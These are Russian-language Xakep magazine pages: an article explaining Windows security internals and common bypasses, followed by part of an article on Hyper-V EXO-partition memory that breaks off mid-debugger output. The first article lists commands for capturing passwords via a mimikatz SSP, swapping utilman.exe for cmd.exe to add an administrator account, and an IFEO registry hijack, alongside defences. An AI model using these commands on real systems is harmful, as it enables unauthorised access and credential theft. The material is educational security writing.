                                               v31v37@yandex.ru




        КАК УСТРОЕНА СИСТЕМА
      БЕЗОПАСНОСТИ WINDOWS
         И КАК ЕЕ ОБХОДЯТ





Когда‐то считалось, что система локальной безопасности
Windows похожа на кованые железные ворота с хитрым зам‐
ком, стоящие посреди чистого поля: выглядят грозно, но вот
эффективность весьма сомнительна. Времена меняются,
и механиз мы защиты вин ды понемногу эволюционируют.
Сегодня мы поговорим о том, как устро ена безопасность
в современных версиях Windows.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.


В Windows все активные сущ ности, которые могут быть аутентифицированы
операционной системой (пользователи или группы), называются участниками
безопасности (security principals). Все учас тники безопасности имеют уни‐
кальный идентификатор переменной длины — Security ID (SID). Выглядит SID,
например, так:


S‐1‐5‐21‐1687231434‐1254558764‐1544283289‐1004

Структура SID — S‐R‐IA‐SA‐RID, где:
 • S — литеральный префикс, ука зывает на то, что идентификатор явля ется
   SID (это просто конвенция наименова ния);
 • R — однобайтное зна чение версии или ревизии (revision) SID. Пока сущес‐
   твует только версия 1;
 • IA — источник выдачи (issuing authority), шестибайтное значение. Указыва‐
   ет, в чьей области ответственности был выдан SID (буквально authority зна‐
   чит «орган власти»). Почти всегда имеет зна чение 5 (SECURITY_NT_AU
  THORITY), за исклю чением well‐known SID, о которых мы поговорим чуть
   позже. Например, 1 озна чает SECURITY_WORLD_SID_AUTHORITY и отно‐
   сится к well‐known‐группе Everybody;
 • SA — уполномоченный центр (sub‐authority). Уникальное (в рамках IA) зна‐
   чение, состоит из четырех частей: 4‐байтно го числа, указывающего, кем
  был выдан идентифика тор (контроллером домена или локальным компь‐
   ютером), и 12‐байтного значения, которое делится на три час ти и иден‐
   тифицирует конкретный объект, выдавший идентификатор. Смысл этого
   поля в том, что при наличии нескольких доменов в лесу объекты в раз ных
   доменах будут иметь уникальный SA;
 • RID — относительный идентифика тор (Relative‐ID), 4‐байтное значение,
   служит для разделения объектов внут ри домена. Для встроенных учетных
   записей RID всегда будет один и тот же (нап ример, для учетной записи
  администратора RID = 500).

Если быть более точным, то существует SID машины (machine SID) и SID
домена (domain SID). А сам SID представляет собой базовый идентификатор
(S, R, IA, SA) + RID.
   Также есть стандартные так называемые well‐known SID для пользовате‐
лей и групп. Они имеют один и тот же SID на любых системах (например, груп‐
па Everyone или пользователь System).


        WWW

                    Поизучать SID можно с помощью утилиты PsGet‐
                           sid.exe из пакета Sysinternals. А почитать о струк‐
                        туре  SID  более  подробно можно,  например,
                        в этих публикациях:
                    •Процесс управле ния RID в Active Directory
                      •The structure of a SID
                          •Microsoft Security Descriptor (SID) Attributes


Также при администрировании можно допустить небольшой недочет, связан‐
ный  с  дубликацией  сидов.  Иногда  он  влияет  на  безопас ность  или
функциональность (например, когда ОС раз вертывают, прос то копируя диск).
Об этом можно почитать подробнее в статье Марка Руссиновича, еще одной
статье и в VMware knowledge base.
   SID, в свою очередь, входит в так называемый маркер доступа — програм‐
мный объект (структура в ядре Windows), который закрепляется за сессией
(logon session) участников безопас ности пос ле авторизации. За выдачу мар‐
кера, как и за аутентифика цию, отвечает LSASS  (local  security  authority
subsystem).
  Помимо всего прочего, в маркер включены SID пользователя и его групп,
а также механизм привилегий на совершение каких‐либо дей ствий (нап‐
ример, привилегия на отладку debug, которая, кстати, используется в mimikatz
для получения доступа к системным про цес сам).
  После того как удаляется последний ассоцииро ванный с сессией токен,
LSASS удаляет и саму сес сию — таким обра зом завершается сеанс поль‐
зователя. Можно поподробнее изу чить структуру маркера доступа в отладчи‐
ке ядра (kernel debugger) с помощью команды dt_TOKEN. Вообще, если
не получается нагуглить подробности о внутреннем устройстве Windows,
можно изучить структуру самому с помощью средств отладки. Подробности
представ лены в документации Microsoft. С при вилегиями может быть, нап‐
ример, связана такая вещь, как bypass traverse checking.


        WWW

                   Маркеры доступа тоже могут иметь проблемы
                        с   безопасностью.   Вот   несколько   ссылок
                       для более подробного изучения:
                  •Ин тересная исследовательская работа Брайана
                         Александера
                      •Блог по пен тесту и редтиму ired.team
                    •Выступление Андреа Пьерини с конференции
                        Hack in Paris
                  •Статья Windows Privilege Abuse: Auditing, Detec‐
                                 tion, and Defense (Palantir Security)


В свою очередь, для «пассивных» объектов, которые пред назначены для пре‐
доставления к ним доступа извне (их называ ют securable objects), использует‐
ся SD — security descriptor. Это дескриптор для управления доступом к дан‐
ным объектам (например, процесс может иметь SD или SD может быть при‐
вязан к файлу в NTFS). У SD тоже, кста ти, бывают проб лемы с безопасностью.
  В security descriptor вклю чены ACL (access control list), которые бывают двух
видов — SACL (нужен для ведения журнала доступа к объекту) и DACL (нужен
непосредственно для управления доступом). В свою очередь, ACL включают
ACE (access control entry) — каж дая ACE предназначена для конкретного
субъекта, который получает дос туп, и содержит в себе тип (запрет или раз‐
решение) и маску доступа. Пра вильно нас троенные ACL позволя ют перек‐
рыть несанкционированный доступ к объектам внут ри сис темы.
  Однако, если кто‐то загрузится на таком компь ютере в Linux или вытащит
жесткий диск из машины с Windows и примонтирует его в том же Linux, он
сможет прочитать эти данные. В Windows удастся получить доступ к данным
с «чужого» носителя NTFS, только если пользователь или его группа на дру‐
гой системе име ет тот же SID — например, если в ACL выставле но слишком
много прав на well‐known‐группы.
  От этого можно защититься только шифрованием, но стоит быть осторож‐
нее с выбором и использованием инс трумента (см. статьи о проблемах
с шифрованными контейнерами VeraCrypt и BitLocker, а также уязвимостях
NAS).
  В ядре Windows проверки ACL выполняются с помощью security reference
monitor и object manager. Предоставление доступа выглядит так: субъ ект
(пользователь) после авторизации получа ет маркер доступа, затем субъ ект
обращается к файлу, система сравнива ет необ ходимые данные из маркера
доступа с соответствующими ACE в DACL объекта, и в зависимости от раз‐
решений субъект получа ет доступ или отказ.





                     Получение дос тупа

Подробнее о ACL/ACE можно почитать на пор тале Microsoft или на сайте ntf‐
s.com. Также в этом может участво вать механизм Mandatory Integrity Control,
который проверяет доступ к объекту по уровню надежности того, кто этот
доступ запрашивает.


             INFO

                        Кстати, повышение привилегий за  счет DACL
                     было использовано в прошлогодней уязвимости
                       CVE‐2019‐0841  (мы  о  ней  писали).  Криво
                     выпущен ный патч — знакомые грабли, о которых
                      уже рассказывал «Хакер». Так же в 2018 году была
                         уязвимость CVE‐2018‐1036, связанная с обходом
                       разрешений.


Помимо привилегий, есть еще один способ контролировать действия поль‐
зователя, требующие прав администра тора. Для этого был соз дан хорошо
известный UAC (User Access Control). Идеала, разумеется, не бывает, поэтому
вот несколько старых ссылок для дальнейшего изучения методик обхода UAC.
 • Bypass User Account Control (MITRE)
 • Defeating Windows User Account Control (GitHub)
 • FUCK UAC! 10 способов обхода сис темы User Account Control в Windows
   («Хакер»)
 • Техника обхода UAC в Windows 10 через App Paths в реестре («Хакер»)
 • UAC Bypass, или история о трех эскалациях (Хабр)
 • How to bypass UAC in newer Windows versions (zc00l)
 • User Account Control — What Penetration Testers Should Know (Cobalt Strike)


АУТЕНТИФИКАЦИЯ И АВТОРИЗАЦИЯ
Как уже упоминалось, за аутентификацию отвечает LSASS. На деле, конечно,
все выглядит сложнее. Ниже приведена схема механизма аутентификации
для старых версий Windows.





Вкратце это работает так: в LSASS пос тупа ют аутентификационные данные
(пароль, биомет рия и прочее), затем Windows про изводит авторизацию. Хеш
от аутентификационных данных кладется в SAM, а пользовательскому про‐
цессу назначается маркер доступа. Рас простра ненная проблема состоит
в том, что можно сохраненные хеши сдампить (например, при помощи всем
известного mimikatz) и провес ти атаку pass‐the‐hash.
  В Windows 10 добавили Credential Guard (вместе с ним, кстати, появил ся
новый процесс — Lsalso.exe). Этот механизм дол жен был защитить, в час‐
тности, от использования mimikatz. Но на каждого хитреца найдется свой муд‐
рец.
  Прежде всего, Credential Guard — опциональная функция, которая может
быть отключена. Так как Credential Guard основан на механизме Virtual Secure
Mode (VSM), который, в свою очередь, базируется на механизмах виртуали‐
зации CPU, то не стоит забывать и об аппаратных уяз вимостях, позволяющих
обойти Credential Guard.
   Ну и напоследок нужно помнить, что введенный пароль преодолевает
некоторый путь перед тем, как будет сохранен в компьютере для последу‐
ющей авторизации. Это зна чит, что его мож но получить с помощью кейлог‐
гера или кастомного SSP (security support provider). Пос леднее возможно
с помощью mimikatz — пример есть в недавней статье. Помимо mimikatz,
перехватить пароль помогут Empire, SharpSploit или PowerSploit, в которых,
по сути, используется интегрированный mimikatz. Альтернативой в PowerSploit
могут быть сле дующие команды:


Import‐Module .\PowerSploit.psm1
Install‐SSP ‐Path .\mimilib.dll


        WWW

                     Для общего развития полезно будет почитать
                      презентацию по pass‐the‐hash для Windows 10,
                      представленную  институтом SANS,  и  изучить
                      основные методы защиты от mimikatz в домене
                           Active Directory.


Естественно, обой ти системы безопас ности Windows позволят и методы
социальной инженерии. Например, можно через msf и msfvenom получить
реверс‐шелл, с помощью его загрузить на целевую сис тему специальный
исполняемый файл для имитации окна авторизации, а потом запустить его
из шелла. На экране пользователя отоб разится окно, как при входе в сис‐
тему, — при этом инстру мент проверя ет, пра виль ный ли пароль введен.
   Кстати, есть старый трюк для обхода окна авторизации, который на удив‐
ление может сработать и в Windows 10. Суть этого способа в том, что нужно
заменить программу sethc.exe на cmd.exe простым переиме нованием,
а затем вызвать sethc.exe, пять раз нажав клавишу Shift. После этого можно
сменить пароль пользователя. Еще в Windows 10 существу ет возможность
сделать примерно следующее:
 1. Вставить загрузочный USB, перезаг рузить компь ютер, затем нажать Shift +
   F10, чтобы открыть cmd.exe.
 2. Ввести команду move D:\windows\Sstem32\utilman.exe D:\win
  dows\system32\utilman.exe.bak.
 3. Для маскировки cmd под utilman ввес ти команду copy D:\windows\
  system32\cmd.exe D:\windows\System32\utilman.exe.
 4. Перезагрузить компьютер без загрузочного USB.
 5. После загрузки нажать «Специальные возможности» (рядом с кнопкой
   выключения питания в окне авториза ции).
 6. Для создания нового пользователя ввести команду net user youruser
  /add.
 7. Для добав ления нового пользователя в группы администраторов исполь‐
   зовать команду net localgroup administrators youruser /add.

Можно добиться подобного эффекта, если у тебя уже есть доступ к системе
с правами редактирования реестра. В этом случае нужно в ветке HKEY_LO‐
CAL_MACHINE\SOFTWARE\Microsoft\Windows    NT\CurrentVersion\Image
File Execution Options\ добавить раз дел utilman.exe, в котором про‐
писать ключ с типом String Value и значением в виде пути до нужной прог‐
раммы. Эта программа будет запускать ся при попытке открыть окно спе‐
циальных возможностей.
  От этого опять‐таки спасает шифрование дис ка. Для запрета смены
пароля определенного юзера мож но использовать учетную запись Microsoft
вместо локальной. Также можно отклю чить для всех юзеров права на выпол‐
нение utilman.exe и sethc.exe. Ну и дополнительно включить Secure Boot
и пос тавить пароль на BIOS/UEFI. Кстати, этот трюк показывался в сериале
Mr.Robot в третьей серии четвертого сезона.
   Также для байпаса окна авториза ции есть старый, но по‐прежнему
рабочий инструмент (с поддержкой Windows 10) под названием kon‐boot.
Правда, работает он с некоторыми огра ничениями (например, не под держи‐
вается включенный secure boot). Чтобы защититься от него, нужно включить
в системе функции, которые инс трумент не поддерживает. Ну и конечно,
не стоит забывать про HID‐ата ки (см. обзорные статьи за 2015 и 2018 годы,
а также руководство по соз данию BadUSB с Wi‐Fi на Arduino).


ПОСТЭКСПЛУАТАЦИЯ
Часто бывает так, что эксплуата ция уяз вимос ти ведет к получению дос тупа,
например, к учетной записи веб‐сервера, а не к учетной записи администра‐
тора. Пути тут два: повышать привилегии и искать интерес ную информацию,
к которой есть доступ. Если речь идет о доменном компьютере, то также мож‐
но почерпнуть полезные сведения из недавней статьи, посвященной сбору
информации в домене. Для поис ка интерес ностей в скомпрометированной
системе есть множество скриптов, нап ример winPEAS, Seatbelt, Powerless,
Privesc, Sherlock, JAWS, Watson и SharpUp.
  Но стоит учесть, что такие скрипты «шумные». Тем более программы, тре‐
бующие .NET, могут и не сра ботать, если в системе нас троен белый список
ПО.


Дополнительные ссылки
При желании ты можешь сам поискать нужную информацию. В этих целях
рекомендуется исполь зовать списки LPE (local privilege escalation). Вот нес‐
колько полезных ссылок:
 • Windows Local Privilege Escalation (HackTricks)
 • Windows / Linux Local Privilege Escalation Workshop (sagishahar)
 • Privilege Escalation (ired.team)
 • Windows — Privilege Escalation (swisskyrepo)
 • Windows‐Privilege‐Escalation (frizb)
 • Windows Privilege Escalation — a cheatsheet (pentest.tonyng.net)
 • Privilege Escalation Windows (Total OSCP Guide)
 • Windows Privilege Escalation Guide (absolomb.com)
 • Windows Privilege Escalation Scripts & Techniques (Рахмат Нурфаузи)
 • Stored Credentials (Penetration Testing Lab)
 • Стань админом! 11 техник атак с повышением привилегий в Windows
   («Хакер»)
 • Основы повышения привилегий в Windows (artdeep.i.tech)



В материалах, ссылки на которые приведены выше, мелькает экс плуатация
ядра как способ повышения привилегий. Стоит учесть, что в Windows есть
механизм защиты ядра Kernel Patch Protection (PatchGuard), но и этому
механизму тоже не чужды уяз вимости. Также при пос тэксплуатации стоит
знать про наличие AppContainer.


ЗАКЛЮЧЕНИЕ
Безопасность зависит не только от недочетов в логике, но и от программных
ошибок, вплоть до бинар ных уязвимос тей в ядре.
  Появление новых механизмов защиты и спо собов обхода этих механиз‐
мов — бесконечный цикл. Нужно регулярно проводить аудит, в чем тебе
помогут следующие полезные ссылки:
 • Гайд по безопасности дес ктопных версий Windows (CIS)
 • Статья про комплексный аудит безопас ности («Хакер»)
 • Обзор системы безопасности в Windows 10 (Microsoft)
 • Сведения о безопасности в корпоративной версии Windows 10 (Microsoft)

Но для полного понимания вещей полезно знать, как все устроено внутри.
Лучшим источником информации в этой области считается книга Марка Рус‐
синовича под названием Windows internals (на данный момент выпуще на пер‐
вая часть 7‐го издания, вторая часть находится в раз работке).
ВЗЛОМ

 КАК УСТРОЕНА ПАМЯТЬ
HYPER-V


     EXO‐РАЗДЕЛЫ И ВИРТУАЛЬНЫЕ
       МАШИНЫ СТОРОННИХ
         ПРОИЗВОДИТЕЛЕЙ





                                           Артур Худяев
                                                  gerhart@xakep.ru





За последние несколько лет в Microsoft создали массу проб‐
лем для разработ чиков виртуальных машин. Причина тому —
ряд новых тех нологий (VBS, Windows Sandbox, WSL), активно
использующих возможности аппа ратной виртуализации Hy‐
per‐V. Разработчики  стороннего ПО  для виртуали зации
больше не могут применять собственный гипервизор и дол‐
жны полагаться на API, который предоставляет Microsoft.


Платформа виртуализации Hyper‐V, раз работанная в Microsoft, появилась
достаточно давно — первый доклад о ней опуб ликован на конференции Win‐
HEC в 2006 году, сама платформа была интегрирована в Windows Server
2008. На первых порах в Microsoft охотно делились описанием API Hyper‐V (он
даже присутствовал в Microsoft SDK  7.0), но со вре менем официальной
информации об интерфейсах Hyper‐V становилось все меньше. В конце кон‐
цов она осталась толь ко в виде Hyper‐V Top Level Function Speciﬁcation,
которые предоставляют разработчикам операционных систем, желающим
создать условия для работы своей ОС внут ри Hyper‐V.
  Еще большие проб лемы воз никли пос ле того, как в Windows 10 внедрили
технологию Virtualization Based Security (VBS), компоненты которой (Device
Guard, Code Integrity и Credential Guard) используют Hyper‐V для защиты кри‐
тичных компонен тов операционной системы. Оказалось, что сущес твующие
системы виртуализации, такие как QEMU, VirtualBox и VMware Workstation,
не могут работать в этих усло виях при исполь зовании функций аппаратной
виртуализации процес сора. Работающий Hyper‐V просто блокировал их
выпол нение.
  VBS   появился   в   Enterprise‐версии   Windows   10,    build   1511
(ноябрь 2015 года) как отдельный компонент, но в сборке 1607 уже стал
частью ОС, а в декабре 2019‐го его сделали активным по умол чанию. Из‐за
этого начались сбои сторонних виртуальных машин.
  Для решения этой проб лемы Microsoft разработала Windows Hypervisor
Platform API, которые предос тавляют следующие воз можности для сторонних
разработчиков:
 • создание «разделов» Hyper‐V и управление ими;
 • управление памятью для каждого раз дела;
 • управление вир туальными процессорами гипервизора.

Смысл  этих  API в  том,  чтобы предос тавить приложе нию воз можность
управлять ресурсами про цес сора, читать и писать значения регистров, при‐
останавливать работу процес сора, генерировать прерывания. Это некий
абсолютный минимум для работы с виртуальными ресурсами.
   API стали доступны в Windows 10 начиная со сборки 1803 (April 2018 up‐
date), через компонент Windows Hypervisor Platform (WHPX). Первым поддер‐
жкой WHPX обзавелся эмулятор QEMU, для которого программисты Microsoft
разработали модуль  ускорения WHPX, продемонстри ровав,  что  их  API
работоспособны. За ними пос ледова ли разработчики Oracle  VirtualBox,
которым пришлось нес колько раз переписать код поддержки WHPX по при‐
чине изменений в Windows 10 1903.
  Компания VMware выпус тила версию своей виртуальной машины с под‐
держкой Hyper‐V только 28 мая 2020 года (версия 15.5), аргументировав
столь долгую задержку необходимостью переписать весь стек виртуали‐
зации.





При этом реализация VMware для Hyper‐V потеряла поддержку вложенной
виртуализации, и будет ли она добавлена — неизвестно. Также сейчас
обсуждают, что произво дительность замет но снизилась.
   Итого в настоящее время WHPX API используются:
 • в QEMU;
 • VirtualBox;
 • VMware Workstation, начиная с версии 15.5 (а также Preview версии 20H2);
 • Android emulator, созданном Google;
 • Applepie — A Hypervisor For Fuzzing Built With WHVP And Bochs.

Можно сказать, что пока API получа ется исполь зовать эффективно только
в user mode (QEMU, Bochs). И что будет дальше — непонятно. С одной сто‐
роны, можно заметить, что API меня ются. Новые функции появляются каждые
полгода при выходе новой версии Windows и даже при выпуске ежемесячных
кумулятив ных обновле ний.
  Например, вот список функций, экспортируемых vid.dll в зависи мости
от версии Windows.





Как видно, набор функций меняется, осо бенно для серверных версий
Windows.
  Для WHVP API все гораздо более ста бильнее, что, в общем‐то, логично
для публичных API.





Официальная документация Hyper‐V TLFS обновля ется крайне ред ко — пос‐
ледний апдейт затронул появление вло женной виртуализации, но информа‐
ции не слишком много, она поз воляет считать данные о внутренних струк‐
турах гипервизора, что я делал в свое время с помощью утилиты LiveCloudKd.
Пока эту информацию получается использовать толь ко в исследовательских
целях — применить ее на практике, интегрировав, например, в отладчик,
не представляется возможным.
  Отдельно стоит упомянуть, что облако Microsoft Azure использует одну и ту
же кодовую базу с Hyper‐V, о чем говорит менеджер Hyper‐V Бен Армстронг
(запись сессии — на треть ей минуте). Одна ко основной модуль Hyper‐V
в Azure отличает ся и явно соб ран с некоторыми директивами условной ком‐
пиляции (достаточно сравнить hvix64/hvax64 для Windows Server 2019 и Win‐
dows 10, чтобы определить, что они отличаются дос таточно сильно).


Термины и определения

 • WDAG — Windows Defender Application Guard (или MDAG — Microsoft De‐
   fender Application Guard в более новых версиях Windows).
 • Full VM — стандартная пол ноценная вир туальная машина, созданная
   в Hyper‐V Manager. Отличается от контейнеров WDAG, Windows Sandbox,
   Docker в режиме изоляции Hyper‐V.
 • Root ОС — операционная система, в которой установлена серверная
   часть Hyper‐V.
 • Гостевая ОС — операционная система, которая работает в контексте
   эмуляции Hyper‐V, в том числе используя вир туальные устройства, предос‐
   тавляемые гипер визором. В статье могут иметься в виду как Full VM, так
   и контейнеры.
 • TLFS — официальный документ Microsoft Hypervisor Top‐Level Functional
   Speciﬁcation 6.0.
 • GPA (guest physical address) — физичес кий адрес памяти гостевой
   операционной системы.
 • SPA (system physical address) — физический адрес памяти root ОС.
 • Гипервызов (hypercall) — сервис гипервизора, вызываемый посредс‐
   твом выполнения команды vmcall (для процессоров  Intel) с указани ем
  номера гипервызова.
 • VBS (Virtualization Based Security) — средс тво обеспечения безопас‐
   ности на осно ве вир туализации.
 • EXO-раз дел — объект «раздел», соз дава емый при запуске виртуальных
   машин, работающих под управлением Windows Hypervisor Platform API.
 • WHVP API — Windows Hypervisor Platform API.




УСТРОЙСТВО ПАМЯТИ EXO-РАЗДЕЛОВ
В своем исследовании я использовал Windows 10 x64 Enterprise 20H1 (2004)
в качестве root ОС и для некоторых случаев Windows 10 x64 Enterprise
1803 с апдейтами на июнь 2020‐го (ее поддержка закончится в ноябре
2020‐го, поэтому информация предос тавлена исключительно для срав‐
нения). В качестве гостевой ОС — Windows 10 x64 Enterprise 20H1 (2004).
  В Windows SDK 19041 (для Windows 10 2004) присутству ют три заголовоч‐
ных файла:
 • WinHvPlatform.h;
 • WinHvPlatformDefs.h;
 • WinHvEmulation.h.

Функции  экспортируются  библиотекой  winhvplatform.dll  и  описаны
в заголовочном файле WinHvPlatform.h. Эти функции — обертки над сер‐
висами, пре доставляемыми vid.dll (библиотека драйверов инфраструктуры
виртуализации Microsoft Hyper‐V), которая, в свою очередь, вызывает сер‐
висы драйвера vid.sys (Microsoft Hyper‐V Virtualization Infrastructure Driver).
   Кратко рассмотрим, что происхо дит при запуске виртуальной машины.
В качестве референса вос пользуемся ис ходным кодом QEMU WHPX.
  При запуске QEMU в режиме аппа ратного ускорения WHPX соз даются два
дескриптора \Device\VidExo, которые поз воляют получить дос туп к устрой‐
ству, создаваемому драйвером vid.sys, из пользовательского режима.





Оба дескриптора — файловые объекты.





Если посмотреть FsContext каждого, то он указыва ет на различные структуры
данных, имеющие сигнатуры Exo и Prtn.





Логику работы с Prtn‐раз делом (структурой VM_PROCESS_CONTEXT) можно
посмотреть в исходниках драйвера hvmm.sys, который используется в Live‐
CloudKd (ссылка).
  С помощью WinDbg и пла гина PyKD можно пропарсить эту структуру
и вытащить значимые элементы.





Как видно, в драйвере winhvr.sys в массиве WinHvpPartitionArray EXO‐
объект не регистрируется (присутству ет только один Prtn‐объ ект), то есть он
не пол ноценный объект раз дела. EXO‐объект — это адрес переменной vid.
sys!VidExoDeviceContext.





Prtn‐объект, создаваемый для EXO‐раз делов, не содержит имени раз дела.
Например, для  full VM Prtn‐объект содержит имя виртуальной машины,
для контейнеров постоянное имя — Virtual machine. Тем не менее GUID раз‐
дела в объекте EXO‐раздела присутству ет.
  Количество EXO‐функций в драйвере vid.sys не так велико.





В ключе HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vid\
Parameters существует два параметра:


ExoDeviceEnabled
ExoDeviceEnabledClient





Если значение обоих параметров равно 0, то ничего не происходит, но,
как  только один  из  них меняется,  сра зу  сра баты вает функция  Vid.
sys!VidExopRegKeyNotificationHandler (перехват изменений в указанном
клю че реестра регистрируется через nt!ZwNotifyChangeKey на раннем эта‐
пе загрузке драйвера vid.sys).
   Если хотя бы одна из переменных равна 1, то выполняется функция VidEx‐
opDeviceSetupInternal, которая соз дает объект‐устрой ство \Device\VidExo,
символическую ссылку \DosDevices\VidExo и регистрирует функции‐обработ‐
чики:


VidExopFileCreate
VidExopFileClose
VidExopFileCleanup
VidExopIoControlPreProcess

Также она  зарегистрирует  отдельные обработчики  для быстрого  вво‐
да‐вывода (fast I/O):


VidExoFastIoControlPartition
VidExoFastIoControlDriver

Функция завершается вызовом


VidObjectHeaderInitialize(VidExoDeviceContext, ' oxE')

Vid.sys!VidExopIoControlPreProcess — функция, которая используется
для обработки IOCTL‐зап росов, направляемых объекту \Device\VidExo.
Из нее вызывается функция vid.sys!VidIoControlPreProcess, в качес тве
первого параметра которой передается структура VM_PROCESS_CONTEXT.
Если VM_PROCESS_CONTEXT содержит сигнатуру Prtn, то будет выпол нена vid.
sys!VidExoIoControlPartition,  если  Exo,  то  VidExoIoControlDriver
(последняя сводится к выполнению вызова winhvr!WinHvGetSystemInfor‐
mation с определенными парамет рами; впрочем, я не видел, чтобы эта фун‐
кция выполнялась, ведь EXO‐раздел — это не пол ноценный раздел). Соот‐
ветственно, даже в случае WHVP API почти вся работа ведется с Prtn‐объ‐
ектом.
  Из функции vid.sys!VidExoIoControlPartition могут быть вызваны:


VidIoControlPartition
WinHvInstallIntercept


WinHvSetLocalInterruptControllerState
WinHvGetLocalInterruptControllerState


VsmmExoGpaRangeIoctlAccessTrackingControl


VsmmExoGpaRangeIoctlUnmap
VsmmExoGpaRangeIoctlMap

Из vid.sys!VidIoControlPartition может вызываться ограниченный набор
запросов IOCTL.





Он соответствует ограниченному набору функций, пре доставляемых WHVP
API. При выполнении запрещен ного зап роса будет возвращен код ошибки
C0000002h.
   Как видно, функции чтения и записи памяти недоступны через API, поэтому
доступ к ней штатными средс твами невозможен. Необходимо углу биться
во внутренности драйвера vid.sys и рассмотреть структуру создаваемых
блоков памяти.
  В целом организация памяти объектов, управля емых Hyper‐V, выглядит
следующим образом.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
КАК УСТРОЕНА ПАМЯТЬ
            HYPER-V

             EXO‐РАЗДЕЛЫ И ВИРТУАЛЬНЫЕ МАШИНЫ
                  СТОРОННИХ ПРОИЗВОДИТЕЛЕЙ




Если кратко, то для каждой виртуальной машины соз дается объект VM_PRO‐
CESS_CONTEXT. Память виртуальной машины описывается структурами MEMO‐
RY_BLOCK и GPAR_BLOCK.
  Для обычных виртуальных машин, созданных через Hyper‐V Manager,
в структуре MEMORY_BLOCK находится указатель на массив guest OS GPA array,
который сопоставляет SPA и GPA. Каждый MEMORY_BLOCK описывает свой
диапазон GPA. Найдя определенный блок и получив GPA, можно выполнить
функции nt!IoAllocateMdl, nt!MmMapLockedPagesSpecifyCache и  про‐
читать данные из памяти гос тевой ОС или записать их туда.
  При работе с контейнерами соз дается отдель ный kernel mode процесс
vmmem (minimal process). При этом в объекте VM_PROCESS_CONTEXT содер‐
жится ссылка на массив GPAR‐объектов, в которых находятся GPA и сме‐
щения блоков в процессе vmmem. То есть отображение (mapping) памяти уже
выпол нено, и для чтения/записи нужно найти объект, описывающий необ‐
ходимый  GPA, определить смещение  соответствующего блока  памяти
в адресном пространстве vmmem и прочитать его либо записать в данные,
например с помощью встроенной в ядро Windows функции MmCopyVir‐
tualMemory.
   EXO‐разделы име ют дру гую организа цию памяти.





Блоки   памяти   сопос тавляются   через   вызов   vid.sys!VsmmExoG‐
paRangeIoctlMap, из которой вызыва ется vid.sys!VsmmVaGpaCoreMapG‐
paRange.
  Нас в первую очередь интересует vid.sys!VsmmVaGpaCorepFindRange,
которая вызывается из vid.sys!VsmmVaGpaCorepCreateGpaToVaMappings
и дает указатели на две функции.


VsmmVaGpaCorepGpnCompareFunctionByPage
cmp rax, [rdx+40h] ; верхняя граница диапазона GPA
cmp rax, [rdx+38h] ; нижняя граница диапазона GPA


VsmmVaGpaCorepVpnCompareFunctionByPage
cmp rax, [rdx+20h] ; верхняя граница диапазона памяти процесса vmmem
cmp rax, [rdx+18h] ; нижняя граница диапазона памяти процесса vmmem

VsmmVaGpaCorepGpaRangeAllocate — выделяет пул размером 0x70h байт.
  Видим следующие кус ки кода:


lea  rcx, [r13+57A0h]
mov  rdx, rdi
call cs:__imp_RtlRbRemoveNode


lea  rcx, [r13+57B0h]
call cs:__imp_RtlRbRemoveNode

Получается, что в Prtn‐объекте по смещению 0x57A0 и 0x57B0 содержатся
структуры, которые передаются первым параметром функции nt!RtlRbRe‐
moveNode(_In_ PRTL_RB_TREE Tree, _In_ PRTL_BALANCED_NODE Node).
  Определение RtlRbRemoveNode:


3: kd> dt ‐r1 nt!_RTL_RB_TREE
   +0x000 Root             : Ptr64 _RTL_BALANCED_NODE
      +0x000 Children         : [2] Ptr64 _RTL_BALANCED_NODE
      +0x000 Left             : Ptr64 _RTL_BALANCED_NODE
      +0x008 Right            : Ptr64 _RTL_BALANCED_NODE
      +0x010 Red              : Pos 0, 1 Bit
      +0x010 Balance          : Pos 0, 2 Bits
      +0x010 ParentValue      : Uint8B
   +0x008 Encoded          : Pos 0, 1 Bit
   +0x008 Min              : Ptr64 _RTL_BALANCED_NODE
      +0x000 Children         : [2] Ptr64 _RTL_BALANCED_NODE
      +0x000 Left             : Ptr64 _RTL_BALANCED_NODE
      +0x008 Right            : Ptr64 _RTL_BALANCED_NODE
      +0x010 Red              : Pos 0, 1 Bit
      +0x010 Balance          : Pos 0, 2 Bits
      +0x010 ParentValue      : Uint8B

Получается, мы име ем дело с красно‐черными деревьями. В теорию
углубляться не буду, просто посмотрим, каким образом это реализовано
у Microsoft.
  Два дерева VPN (вероятно,  virtual page number) и GPN (guest page
number), адреса вершин которых расположены по смещениям 0x57A0h
и 0x57B0h от начала Prtn‐структуры (для 20H1) соответственно.


2: kd> dps 0xffffd88344414000+0x57a0
ffffd883`444197a0  ffffd883`44dc9b70 — VPN‐дерево (адрес _RTL_RB_TREE
)
ffffd883`444197a8  ffffd883`44dcb060 — VPN‐дерево (адрес корня
_RTL_BALANCED_NODE)
ffffd883`444197b0  ffffd883`443b2890 — GPN‐дерево (адрес _RTL_RB_TREE
)
ffffd883`444197b8  ffffd883`48d75890 — GPN‐дерево (адрес корня
_RTL_BALANCED_NODE)
ffffd883`444197c0  00000000`00000000
ffffd883`444197c8  00000000`00000000

Рассмотрим каждую структуру в отдельнос ти. В GPN‐дереве есть узлы
и листья, включающие, помимо ссылок на другие элементы дерева (заголов‐
ки), полезную нагрузку — адреса guest page number и ссылку на VPN‐узел,
содержащий стар товый и конечный адрес соответству ющего блока памяти
в процессе, обслуживающем виртуальную машину:


2: kd> dt _RTL_RB_TREE ffffd883`444197a0 — VPN‐дерево
nt!_RTL_RB_TREE
   +0x000 Root             : 0xffffd883`44dc9b70 _RTL_BALANCED_NODE
   +0x008 Encoded          : 0y0
   +0x008 Min              : 0xffffd883`44dcb060 _RTL_BALANCED_NODE


2: kd> dt _RTL_RB_TREE ffffd883`444197b0 — GPN‐дерево
nt!_RTL_RB_TREE
   +0x000 Root             : 0xffffd883`443b2890 _RTL_BALANCED_NODE
   +0x008 Encoded          : 0y0
   +0x008 Min              : 0xffffd883`48d75890 _RTL_BALANCED_NODE

Работать будем с GPN‐деревом. Заголовок выг лядит примерно так (можно
посмотреть, какой узел черный, какой крас ный):


2: kd> dx ‐id 0,0,ffffd8833e087040 ‐r1 ((ntkrnlmp!_RTL_BALANCED_NODE
*)0xffffd883443b2890)
((ntkrnlmp!_RTL_BALANCED_NODE *)0xffffd883443b2890)                 :
0xffffd883443b2890 [Type: _RTL_BALANCED_NODE *]
